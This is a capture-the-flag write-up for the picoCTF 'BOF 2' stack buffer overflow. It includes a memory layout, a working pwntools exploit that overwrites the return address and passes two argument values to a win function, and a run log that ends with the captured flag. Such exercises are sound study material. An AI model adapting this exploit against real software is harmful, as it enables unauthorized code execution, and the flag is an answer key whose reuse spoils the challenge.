# BOF 2

## Code inspection

Looking at the code, it's very similar to bof1, but now we also have to pass 2 arguments with a specific value to `win`.

## Memory layout

```
vuln_buff [100]  				[bp-108]
old_bx           				[bp-4]
old_bp  			<---- bp    [bp]
return address   				[bp + 4]
arg1			 				[bp + 8]
arg2			 				[bp + 12]

```

## Getting the flag

We would like to:
- Overwrite the 108 bytes of the vulnerable buffer
- Overwrite the old EBX value
- Overwrite the old EBP valeu
- Overwrite the return address to be the one of `win`
- Overwrite [bp + 8] to be 0xCAFEF00D
- Overwrite [bp + 12] to be 0xF00DF00D

Let's do that using the wonderful pwntools:

```python
from pwn import *

exploit_str = "1" * 104 + "3" * 4 + "2" * 4

conn = connect("saturn.picoctf.net", 63701)

print(conn.recvline().decode())

exploit_str = exploit_str.encode() + p64(0x08049296)
exploit_str += p32(0xcafef00d) + p32(0xf00df00d)

file = open("../pico/reaf_bof_2/bof2_exploit", "wb")
file.write(exploit_str)
file.close()

print("Sending {}".format(exploit_str))
conn.sendline(exploit_str)

print(conn.recv())
print(conn.recv())

conn.close()
```

We get:

```
[x] Opening connection to saturn.picoctf.net on port 63701
[x] Opening connection to saturn.picoctf.net on port 63701: Trying 18.217.86.78
[+] Opening connection to saturn.picoctf.net on port 63701: Done
Please enter your string: 

Sending b'1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111133332222\x96\x92\x04\x08\x00\x00\x00\x00\r\xf0\xfe\xca\r\xf0\r\xf0'
b'1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111133332222\x96\x92\x04\x08\n'
b'picoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
[*] Closed connection to saturn.picoctf.net port 63701
```